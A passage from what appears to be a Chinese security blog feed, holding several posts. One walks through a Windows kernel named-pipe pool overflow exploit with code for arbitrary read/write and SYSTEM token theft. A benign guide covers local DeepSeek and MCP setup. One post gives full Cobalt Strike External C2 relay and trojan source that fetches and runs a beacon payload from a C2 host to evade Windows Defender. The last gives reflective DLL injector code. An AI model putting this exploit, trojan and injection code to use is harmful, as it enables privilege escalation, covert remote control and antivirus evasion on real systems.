大小的数据；2.根据AAAA-&gt;Flink找到BBBB，再读取；3.根据BBBB-&gt;overflown_Flink找打Fake_CCCC，同时根据Fake_CCCC-&gt;Fake-&gt;DataSize的大小读取内存。而且这种方法可以放我们判断溢出的pipe_pool是哪个，这在池喷射中是十分有利的。 ​ **那么如何实现任意地址读取呢？**我们可以看看[1]中的exp是怎么做到的 1234567891011121314151617181920212223242526//...#define NP_HEADER_SIZE 0x30#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)#define USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE&lt;&lt;32)//...void main() &#123; //... if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) &#123; printf(&quot;Couldn&#x27;t allocate base address %p\\n&quot;, USER_DATA_ENTRY_ADDR); return; &#125; //... printf(&quot;Creating the RIGHT entries\\n&quot;); char victim_data[THIRD_ENTRY_SIZE]; DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)victim_data; memset(dqe, 0, sizeof(*dqe)); dqe-&gt;DataSize = THIRD_ENTRY_SIZE + 1; for (int i = 0; i &lt; pipe_pool.size(); i++) &#123; WriteFile(pipe_pool[i].Write, &amp;dqe-&gt;Irp, THIRD_ENTRY_SIZE, &amp;res, 0); &#125; //...&#125; ​ USER_DATA_ENTRY_ADDR计算出来的值是**0xfd000000000，在Creating the RIGHT entries时，申请的dqe中，dqe-&gt;quota=0xfd0，dqe-&gt;DataSize=0xfd0，根据小端序在内存中的排列方式从右到左，dqe-&gt;quota和临近的32位大小全为0的dqe-&gt;EntryTpye的值，合成fake-&gt;flink，而且指向0xfd000000000**。分配变为： ​ 相关的内存信息： ​ 参考最初始的布局图，如果我们想要读取的内容长度超过了DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC，那么就会从FakeCCCC-&gt;flink即**0xfd000000000当作一个DATA_QUEUE_ENTRY，来满足我们的读取。这个时候exp中最开始的VritualAlloc就起到了关键作用，因为他申请到了0xfd000000000这一地址，即使这个地址不是在内核0xfd000000000中，而是在当前的进程中，我们就可以在这里伪造DATA_QUEUE_ENTRY，并且使用unbuffered类型来利用Irp实现内核的任意地址读取**。 12345678910111213141516171819void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) &#123; memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY)); dqe-&gt;EntryType = 1; dqe-&gt;DataSize = -1; dqe-&gt;Irp = irp; irp-&gt;AssociatedIrp = (PVOID)read_address;&#125;void ReadMem(uint64_t addr, size_t len, char* data) &#123; static char* buf = (char*)malloc(TOTAL_DATA_SIZE + 1 + 0x5000); DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR; DWORD read; assert(len &lt; 0x5000); PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000), addr); PeekNamedPipe(g_victim_pipe-&gt;Read, buf, TOTAL_DATA_SIZE + 1 + len, &amp;read, 0, 0); memcpy(data, buf + TOTAL_DATA_SIZE + 1, len);&#125; 如何读取到当前进程的Token地址？ ​ 与常规思路类似，我们依旧是找到当前进程的EPROCESS。首先基于此我们拥有了任意地址读，那么就可以泄露出一个正常的DATA_QUEUE_ENTRY，比如和CCCC物理地址相邻的dqe，我们称为DDDD(如上图)。exp中的DDDD是这样申请的 12345678910111213141516171819DWORD WINAPI ThreadedWriter(void* arg) &#123; char* buf = (char*)arg; DWORD res; WriteFile(g_victim_pipe-&gt;Write, buf, FIRST_ENTRY_SIZE, &amp;res, NULL); Sleep(-1); return 0;&#125;void main()&#123; //... printf(&quot;Creating an entry with size greater than the available pipe quota\\n&quot;); CreateThread(0, 0, ThreadedWriter, buf, 0, 0); //we could have used overlapped/completion routines Sleep(2000); //... //&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds //...&#125; ​ DDDD-&gt;Irp结构具体如下，详细可见IRP 结构 （wdm.h）[4] 11: kd&gt; dt nt!_IRP ​ 这里又引申小问题：为什么要使用CreateThread来进行新的dqe？这就要提到ThreadListEntry的作用了 当一个线程发起异步 I/O 操作时，内核会将 IRP 插入到线程的 ThreadListEntry 链表中。线程可以通过遍历该链表检查是否有未完成的 I/O 请求。 ​ 这里创建线程来创建起到的就是 线程发起异步 I/O 操作 的作用。在 Windows 内核中，每个线程都由一个 ETHREAD（Executive Thread）结构体表示，其中包含一个 IrpList 字段，用于管理该线程的所有 挂起（Pending）I/O 请求（即未完成的 IRP） ​ 我们查看这个Irp所属的线程是那个_ETHREAD 1234560: kd&gt; dt nt!_IRP ffffbe0f`9d473c30 Tail.Overlay.Thread +0x078 Tail : +0x000 Overlay : +0x020 Thread : 0xffffbe0f`9d0cb080 _ETHREAD0: kd&gt; dt nt!_ETHREAD 0xffffbe0f`9d0cb080 Tcb +0x000 Tcb : _KTHREAD ​ _ETHREAD结构体如下 ​ 如果你了解过windows内核提权的方法的话，如从零探索现代windows内核栈溢出-以HEVD练习为例（下）[5]，你就会了解到在栈溢出中我们使用的是gs:[188h]指向的是一个_KTHREAD结构体，通过_KTHREAD找到_EPROECSS，然后找到了当前进程的_EPROCESS，而且就可以通过遍历得到 System 的_EPROCESS。 1234567890: kd&gt; !thread 0xffffbe0f9d0cb080THREAD ffffbe0f9d0cb080 Cid 0ea8.0c30 Teb: 000000f50d798000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable ffffbe0f9ff9f668 NotificationEventIRP List: ffffbe0f9d473c30: (0006,0358) Flags: 00060a00 Mdl: 00000000Not impersonatingDeviceMap ffff8486d91f0b10Owning Process ffffbe0f9da7e340 Image: exploits.exe... ​ 之后通过``EPROCESS获得自身ActiveProcessLinks`，同时向前/向后查找，找到pid=4的进程，则该进程就为System，之后就是根据偏移读取Token 123456789101112131415161718192021222324252627282930313233343536uint64_t GetProcessById(uint64_t first_process, uint64_t pid) &#123; uint64_t current_pid = 0; uint64_t current_process = first_process; while (1) &#123; ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&amp;current_pid); if (current_pid == pid) return current_process; ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + 8, 8, (char*)&amp;current_process); current_process -= c_offsets[g_setoff][EPROCESS_PID] + 8; if (current_process == first_process) return 0; &#125;&#125;void main()&#123; //... char irp_data[0x1000]; ReadMem(irp_addr, 0x1000, irp_data); IRP* irp = (IRP*)irp_data; uint64_t cp_thread_list_head, current_process, current_process_id, system_process; //&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds ReadMem((uint64_t)irp-&gt;ThreadListEntry.Flink + 0x38, 8, (char*)&amp;cp_thread_list_head); current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD]; ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&amp;current_process_id); if (current_process_id != GetCurrentProcessId()) g_setoff++; current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD]; system_process = GetProcessById(current_process, 4); printf(&quot;Found current process: %p system process: %p\\n&quot;, current_process, system_process);&#125; 任意地址写实现 ​ 根据前文的描述，当客户端读取服务端发送的消息时，利用甚于配额分配机制，Quota&lt;Datasize，就会触发对应dqe的Irp，将irp-&gt;AssociatedIrp的值写入到irp-&gt;UserBuffer中。那么我们可以伪造Irp，然后执行ReadFile触发Irp。但是Irp对于系统来说十分的严格，[1]中利用了任意读复制一个合法的Irp，然后改造。原文提醒： 务必使用非缓冲条目来保存伪造的 IRP，因为它很可能会在 IofCompleteRequest 调用结束时被释放 1234567891011121314DATA_QUEUE_ENTRY: NextEntry.Flink=可访问的合法地址; Irp=特殊伪造的irp; SecurityContext=0; EntryType=0; QuotaInEntry=DataSize-1; DataSize=任意地址写的大小; x=无所谓; Forged IRP: Flags=Flags&amp;~IRP_DEALLOCATE_BUFFER|IRP_BUFFERED_IO|IRP_INPUT_OPERATION; AssociatedIrp=源地址; UserBuffer=目的地址; ThreadListEntry.Flink-&gt;Blink==ThreadListEntry.Blink-&gt;Flink==&amp;ForgedIRPAddr-&gt;ThreadListEntry; ​ 相关代码如下 123456789101112131415void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) &#123; irp-&gt;Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION; irp-&gt;AssociatedIrp = source_address; irp-&gt;UserBuffer = destination_address; irp-&gt;ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list); irp-&gt;ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);&#125;void main()&#123; //... uint64_t thread_list[2]; PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN])); NtFsControlFile(g_victim_pipe-&gt;Write, 0, 0, 0, &amp;isb, 0x119FF8, irp, 0x1000, 0, 0);//创建unbuffered存放伪造的Irp //...&#125; ​ 回忆前文命名管道介绍中的描述： unbuffered: EntryType=1，DATA_QUEUE_ENTRY 中申请的buf大小只存放DATA_QUEUE_ENTRY，读取时要调用IRP来实现读取。 ​ 那么对PrepareWriteIRP函数生成的Irp这块内存的读写都要通过unbuffered-&gt;Irp进行 ​ 如果Irp执行就是从0xffffe20fa485e4f8的值复制到0xffffe20faab3b538，并且0xffffe20fa485e4f8的值就为Token的值 ​ 然后设置qde-&gt;Irp后触发 12345678910111213141516171819void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) &#123; memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY)); dqe-&gt;Flink = (uint64_t)dqe; dqe-&gt;EntryType = 0; dqe-&gt;DataSize = size; dqe-&gt;Irp = irp;&#125;void main()&#123; //... dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR; PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE); thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink); printf(&quot;Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\\n\\n&quot;); ReadFile(g_victim_pipe-&gt;Read, buf, ARBITRARY_WRITE_SIZE, &amp;res, 0); //... &#125; ​ ReadFile时，依旧会从AAAA开始读取8字节，同时AAAA-&gt;quota-=8 ​ 之后会调整队列中dqe的quota大小，正常来说对于我们伪造的dqe的quota&lt;size的，这个时候就会调用Irp，然后quota+=8；但是我们修改了CCCC-&gt;flink=DDDD，即指向0xfd000000000，并且我们在DDDD中伪造了Irp，那么就会调用该Irp。 ​ 最后成功复制token完成提权 引用 [1] Windows-Non-Paged-Pool-Overflow-Exploitation https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation [2] 【免杀】使用CobaltStrike的外置监听器绕过检测 https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg [3] 从零探索现代windows内核栈溢出-以HEVD练习为例（上）https://xz.aliyun.com/news/12806 [4] IRP 结构 （wdm.h） https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp [5] 从零探索现代windows内核栈溢出-以HEVD练习为例（下） https://xz.aliyun.com/news/12808","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【AI】本地部署DeepSeek并使用MCP","slug":"local-deepseek-MCP","date":"2025-04-05T06:47:50.000Z","updated":"2025-04-05T07:38:27.951Z","comments":true,"path":"2025/04/05/local-deepseek-MCP/","link":"","permalink":"https://joe1sn.eu.org/2025/04/05/local-deepseek-MCP/","excerpt":"主要是一些配置，同时算是备忘手册","text":"主要是一些配置，同时算是备忘手册 本地部署DeepSeek 首先是部署DeepSeek R3 我是使用的是LM Studio，下载链接：https://lmstudio.ai/ 下载完成后需要按照如下逻辑结构创建文件夹： 然后下载DeepSeek的模型，国内可以通过魔塔社区等下载，会快很多。 我的显卡是GTX1650 MaxQ，显存只有4G。使用：DeepSeek-R1-Distill-Qwen-7B-GGUF AI相关最重要的就是显卡的显存，关于显卡参数可以在 任务管理器 -&gt; 性能 中看到，如果只有一个intel的集显，那么得下载对应的显卡驱动。 deepseek 1.5b：几乎没有显卡要求 deepseek 7b： 至少4G显存 deepseek 8b： 至少6G显存 deepseek 14b： 12G显存 deepseek 32b：至少24G显存 如果配置正确就可以在LM Studio中看到了 一般配置如下 建议开启 闪电注意力(Fast attention)，同时如果需要使用MCP建议将上下文长度改为至少 8192 等待模型加载后即可使用。 使用完成后记得弹出！ MCP使用 这里讲最简单的使用：下载一个 5ire 在这里设置相关参数，如：使用Deepseek的官方API 如果使用本地的AI，需要设置下LM Studio 然后在5ire中设置如下： 这里的模型应该在连接成功后即可使用选择，并且在LM Studio中能看到API请求如下 在工具-&gt;工具市场中可以看到许多MCP Server，这里已Web举例，这个MCP的功能是访问网页 安装完成后需要在工具中启用 之后点击 新对话 就可以使用了，如： 然后是本地的效果，反应的速度取决显卡，一般来说巨卡。因为本地模型是小参数，要笨很多，所以promote要详细些 安装MCP 在工具中新建即可，这里用ida-pro-mcp这个举例 官方的json配置格式如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&#123; &quot;mcpServers&quot;: &#123; &quot;github.com/mrexodia/ida-pro-mcp&quot;: &#123; &quot;command&quot;: &quot;uv&quot;, &quot;args&quot;: [ &quot;--directory&quot;, &quot;c:\\\\MCP\\\\ida-pro-mcp&quot;, &quot;run&quot;, &quot;server.py&quot;, &quot;--install-plugin&quot; ], &quot;timeout&quot;: 1800, &quot;disabled&quot;: false, &quot;autoApprove&quot;: [ &quot;check_connection&quot;, &quot;get_metadata&quot;, &quot;get_function_by_name&quot;, &quot;get_function_by_address&quot;, &quot;get_current_address&quot;, &quot;get_current_function&quot;, &quot;convert_number&quot;, &quot;list_functions&quot;, &quot;list_strings&quot;, &quot;search_strings&quot;, &quot;decompile_function&quot;, &quot;disassemble_function&quot;, &quot;get_xrefs_to&quot;, &quot;get_entry_points&quot;, &quot;set_comment&quot;, &quot;rename_local_variable&quot;, &quot;rename_global_variable&quot;, &quot;set_global_variable_type&quot;, &quot;rename_function&quot;, &quot;set_function_prototype&quot;, &quot;declare_c_type&quot;, &quot;set_local_variable_type&quot; ], &quot;alwaysAllow&quot;: [ &quot;check_connection&quot;, &quot;get_metadata&quot;, &quot;get_function_by_name&quot;, &quot;get_function_by_address&quot;, &quot;get_current_address&quot;, &quot;get_current_function&quot;, &quot;convert_number&quot;, &quot;list_functions&quot;, &quot;list_strings&quot;, &quot;search_strings&quot;, &quot;decompile_function&quot;, &quot;disassemble_function&quot;, &quot;get_xrefs_to&quot;, &quot;get_entry_points&quot;, &quot;set_comment&quot;, &quot;rename_local_variable&quot;, &quot;rename_global_variable&quot;, &quot;set_global_variable_type&quot;, &quot;rename_function&quot;, &quot;set_function_prototype&quot;, &quot;declare_c_type&quot;, &quot;set_local_variable_type&quot; ] &#125; &#125;&#125; 在5ire中如下，他会自动完善其他参数 关于MCP管理 这里说了5ire，也可以使用其他的，个人认为比较初略的框架可以试试mcp-bridge，因为他只做了中间服务，连ui都没有，方便二次开发","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://joe1sn.eu.org/tags/AI/"}]},{"title":"【免杀】使用CobaltStrike的外置监听器绕过检测","slug":"cs-external","date":"2025-02-28T14:23:28.000Z","updated":"2025-02-28T14:26:11.536Z","comments":true,"path":"2025/02/28/cs-external/","link":"","permalink":"https://joe1sn.eu.org/2025/02/28/cs-external/","excerpt":"可能是最简单一种免杀方式了 公众号：https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg","text":"可能是最简单一种免杀方式了 公众号：https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg 或许我们的公众号会有更多你感兴趣的内容 【免杀】使用CobaltStrike的外置监听器绕过检测 背景 起源于一次免杀马的制作，当我制作好了过后，在windows defender（后文简称为wd）中测试时 [x] 本地扫描能够通过 [x] CobaltStrike TeamServer能显示木马的正常上线 [ ] 上线后本地木马立即被查杀 结论 这里直接上结论，想要知道原因可以看下文 首先给出猜测：是windows defender有类似的waf，并且由于cobaltstrike的stager payload的加载方式被wd识别出 给出解决办法：想办法加密/混淆Teamserver和Tojan的流量，类似于下图 在CS上有一种监听器叫做：External C2 只需要绑定本地的端口即可 同时我们需要编写一个 转发器、收发的torjan 转发器编写 为了方便，这里就使用Tcp socket进行编写 首先需要一个转发的类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import socketimport structimport timeclass ExternalC2Controller: def __init__(self, port): self.port = port def encodeFrame(self, data): if type(data) == bytes: return struct.pack(&quot;&lt;I&quot;, len(data)) + data else: return struct.pack(&quot;&lt;I&quot;, len(data)) + data.encode(&quot;utf-8&quot;) def decodeFrame(self, data): len = struct.unpack(&quot;&lt;I&quot;, data[0:3]) body = data[4:] return (len, body) def sendToTS(self, data): self._socketTS.sendall(self.encodeFrame(data)) def recvFromTS(self): data = b&quot;&quot; _len = self._socketTS.recv(4) l = struct.unpack(&quot;&lt;I&quot;, _len)[0] while len(data) &lt; l: data += self._socketTS.recv(l - len(data)) return data def sendToBeacon(self, data): self._socketClient.sendall(self.encodeFrame(data)) def recvFromBeacon(self): data = b&quot;&quot; _len = self._socketClient.recv(4) l = struct.unpack(&quot;&lt;I&quot;, _len)[0] while len(data) &lt; l: data += self._socketClient.recv(l - len(data)) return data def run(self): # First thing, wait for a connection from our custom beacon self._socketBeacon = socket.socket( socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketBeacon.bind((&quot;0.0.0.0&quot;, 12222)) self._socketBeacon.listen(1) self._socketClient = self._socketBeacon.accept()[0] print(&quot;Received C2 connection&quot;) # Now we have a beacon connection, we kick off comms with CS External C2 self._socketTS = socket.socket( socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketTS.connect((&quot;192.168.48.129&quot;, self.port)) # Send out config options self.sendToTS(&quot;arch=x86&quot;) self.sendToTS(&quot;pipename=xpntest&quot;) self.sendToTS(&quot;block=1000&quot;) self.sendToTS(&quot;go&quot;) # Receive the beacon payload from CS to forward to our custom beacon data = self.recvFromTS() while (True): print(&quot;Sending %d bytes to beacon&quot; % len(data)) self.sendToBeacon(data) data = self.recvFromBeacon() print(&quot;Received %d bytes from beacon&quot; % len(data)) print(&quot;Sending %d bytes to TS&quot; % len(data)) self.sendToTS(data) data = self.recvFromTS() print(&quot;Received %d bytes from TS&quot; % len(data))controller = ExternalC2Controller(2222)controller.run() 这里需要说明的是，转发器和teamserver之间的通讯tcp报文是 也就是说先从tcp流中读取4字节，然后这4字节作为长度，再从流中读取这一长度的剩余报文。这一点也可以从recvFromBeacon看出 首先创建和 teamserver的 externalC2监听器的socket连接，然后监听本地的12222端口的tcp流量，一旦有请求流向监听的12222端口，就开始向teamserver传输上线信息，其中 arch：torjan的位数 pipename：需要使用到的管道名称，在程序中就为\\\\,\\pipe\\$&#123;pipename&#125; go：表示传输初始化信息完毕，torjan已经上线 当 teamserver收到torjan上线消息后，会返回一段data，这段data就是stager(有阶段)的第二段payload，通过之前讲过的反射式dll注入运行，由于使用的dll被各种标记，所以这里很有可能被检测出，如果对teamserver的这段dll进行加密后再发送给torjan，那么在torjan内，至少这段dll解密进入内存之前是安全的 第三方客户端编写 也就是我们的马子，torjan 根据上面的简单分析，主要过程如下： 创建到转发器的socket 接收并解密转发器返回的shellcode，想办法运行这段shellcode 12345678910 DWORD payloadLen = 0; char *payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // 连接到转发器 SOCKET c2socket = createC2Socket(&quot;192.168.48.129&quot;, 12222); payloadData = recvData(c2socket, &amp;payloadLen);//运行shellcode spawnBeacon(payloadData, payloadLen); 如果你逆向分析过cs生成的artifact.exe，你会发现它使用管道通讯 为什么要使用管道通讯呢？ 之前在讲转发器的最后一个部分，因为第二段payload是一个dll，如何保持该dll和主程序之间的通讯？解决的方法就是使用命名管道，这也是为什么要在初始上线的时候传输管道的名称，这样才能生成torjan生成的torjan_dll。 通过管道将：teamserver-&gt;转发器-&gt;torjan 的数据，通过管道传输到 torjan_dll，反之亦然 123456789101112131415161718192021// Loop until the pipe is up and ready to usewhile (beaconPipe == INVALID_HANDLE_VALUE) &#123; // Create our IPC pipe for talking to the C2 beacon Sleep(500); beaconPipe = connectBeaconPipe(&quot;\\\\\\\\.\\\\pipe\\\\xpntest&quot;);&#125;while (1) &#123; // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData);&#125; 关于管道数据的解析，和转发器到teamserver的一致 测试一下windows defender 这里就简单测试下没有加密过的 完整代码如下，建议使用 Visual Studio，位数x86 编译 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#include &lt;Windows.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)// Allocates a RWX page for the CS beacon, copies the payload, and starts a new threadvoid spawnBeacon(char* payload, DWORD len) &#123; HANDLE threadHandle; DWORD threadId = 0; char* alloc = (char*)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(alloc, payload, len); threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &amp;threadId);&#125;// Sends data to our C2 controller received from our injected beaconvoid sendData(SOCKET sd, const char* data, DWORD len) &#123; char* buffer = (char*)malloc(len + 4); if (buffer == NULL) return; DWORD bytesWritten = 0, totalLen = 0; *(DWORD*)buffer = len; memcpy(buffer + 4, data, len); while (totalLen &lt; len + 4) &#123; bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0); totalLen += bytesWritten; &#125; free(buffer);&#125;// Receives data from our C2 controller to be relayed to the injected beaconchar* recvData(SOCKET sd, DWORD* len) &#123; char* buffer; DWORD bytesReceived = 0, totalLen = 0; *len = 0; recv(sd, (char*)len, 4, 0); buffer = (char*)malloc(*len); if (buffer == NULL) return NULL; while (totalLen &lt; *len) &#123; bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0); totalLen += bytesReceived; &#125; return buffer;&#125;// Creates a new C2 controller connection for relaying commandsSOCKET createC2Socket(const char* addr, WORD port) &#123; WSADATA wsd; SOCKET sd; SOCKADDR_IN sin; WSAStartup(0x0202, &amp;wsd); memset(&amp;sin, 0, sizeof(sin)); sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.S_un.S_addr = inet_addr(addr); sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin)); return sd;&#125;// Connects to the name pipe spawned by the injected beaconHANDLE connectBeaconPipe(const char* pipeName) &#123; HANDLE beaconPipe; beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL); return beaconPipe;&#125;// Receives data from our injected beacon via a named pipechar* recvFromBeacon(HANDLE pipe, DWORD* len) &#123; char* buffer; DWORD bytesRead = 0, totalLen = 0; *len = 0; ReadFile(pipe, len, 4, &amp;bytesRead, NULL); buffer = (char*)malloc(*len); while (totalLen &lt; *len) &#123; ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL); totalLen += bytesRead; &#125; return buffer;&#125;// Write data to our injected beacon via a named pipevoid sendToBeacon(HANDLE pipe, const char* data, DWORD len) &#123; DWORD bytesWritten = 0; WriteFile(pipe, &amp;len, 4, &amp;bytesWritten, NULL); WriteFile(pipe, data, len, &amp;bytesWritten, NULL);&#125;int main()&#123; DWORD payloadLen = 0; char* payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // Create a connection back to our C2 controller SOCKET c2socket = createC2Socket(&quot;192.168.1.4&quot;, 12222); payloadData = recvData(c2socket, &amp;payloadLen); // Start the CS beacon spawnBeacon(payloadData, payloadLen); // Loop until the pipe is up and ready to use while (beaconPipe == INVALID_HANDLE_VALUE) &#123; // Create our IPC pipe for talking to the C2 beacon Sleep(1000); beaconPipe = connectBeaconPipe(&quot;\\\\\\\\.\\\\pipe\\\\xpntest&quot;); &#125; while (TRUE) &#123; // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData); &#125; return 0;&#125; 参考 https://github.com/xpn/AppProxyC2","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【免杀】反射式DLL注入详解","slug":"reflect_dll","date":"2025-01-01T06:50:28.000Z","updated":"2025-02-27T07:20:55.075Z","comments":true,"path":"2025/01/01/reflect_dll/","link":"","permalink":"https://joe1sn.eu.org/2025/01/01/reflect_dll/","excerpt":"公众号：https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A","text":"公众号：https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A 或许我们的公众号会有更多你感兴趣的内容 【免杀】反射式DLL注入详解 在前文：PE文件格式解析、常见的DLL和Shellcode注入方式中已经讲解了基本的注入方式和PE文件结构。那么我们可以提出这样指一种注入方式：将dll的内容放到目标进程中，然后找到这个dll完成PE映射到内存的函数（假设为void loader()），这也要求loader函数一定要在导出表上。 获得dllloader函数在内存中的虚拟地址 注入器将dll写入目标进程然后调用loader loader运行 注入器编写 打开dll文件 123456789101112131415161718192021 std::string path; DWORD pid; std::cout &lt;&lt; &quot;[+] pid: &quot;; scanf_s(&quot;%d&quot;, &amp;pid);std::cin.ignore(); std::cout &lt;&lt; &quot;[+] DLL Path: &quot;; std::getline(std::cin, path); //1.打开dll文件 HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Create File Failed\\n&quot;; return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); if (dwFileSize == 0) &#123; std::cout &lt;&lt; &quot;File Size is Zero!\\n&quot;; CloseHandle(hFile); return 0; &#125; 将dll写入到目标进程 1234567891011121314151617181920212223242526272829303132333435HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);if (hProcess == INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Allocate Address or Open Process Failed\\n&quot;; CloseHandle(hFile); return 0;&#125; LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);if (pBase == NULL) &#123; std::cout &lt;&lt; &quot;Allocate Memory Failed\\n&quot;; CloseHandle(hFile); CloseHandle(hProcess); return 0;&#125; SIZE_T dwWriteSize = 0;char* buffer = new char[dwFileSize];DWORD dwReadSize;if (ReadFile(hFile, buffer, dwFileSize, &amp;dwReadSize, NULL) == FALSE) &#123; std::cout &lt;&lt; &quot;Failed to read the file.\\n&quot;; delete[] buffer; VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT); CloseHandle(hFile); CloseHandle(hProcess); return 0;&#125;bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);if (dwWriteSize != dwFileSize) &#123; std::cout &lt;&lt; &quot;File Load partitially\\n&quot;; delete[] buffer; VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT); CloseHandle(hFile); CloseHandle(hProcess); return 0;&#125; 获得loader函数地址 按照之前提到的pe格式，就是从IMAGE_DATA_DIRECTORY的导出表中，利用FirstThunk进行遍历，如果字符串匹配，就根据结构体的相关变量找到函数地址 首先是得到RVA转换的函数 12345678910111213141516171819DWORD VA2RVA(DWORD64 dwRva, DWORD64 BaseAddress) &#123; DWORD64 VA = 0; DWORD64 RVA = 0; DWORD64 sectionHeader; DWORD64 ntheader = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)-&gt;e_lfanew; WORD sectionNum = ((PIMAGE_NT_HEADERS64)ntheader)-&gt;FileHeader.NumberOfSections; for (size_t i = 0; i &lt; sectionNum; i++) &#123; sectionHeader = ntheader + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); if (((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress &gt; dwRva) break; VA = 